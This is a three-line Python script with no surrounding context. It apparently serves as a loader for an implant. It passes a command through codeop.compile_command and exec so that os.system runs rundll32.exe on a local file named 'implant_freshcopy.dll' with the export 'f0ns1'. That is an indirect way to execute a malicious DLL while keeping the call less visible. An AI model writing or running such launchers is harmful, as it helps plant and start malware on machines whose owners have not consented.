#!/usr/python

import codeop
object=codeop.compile_command('__import__("os").system("rundll32.exe .\implant_freshcopy.dll,f0ns1")')
exec(object)
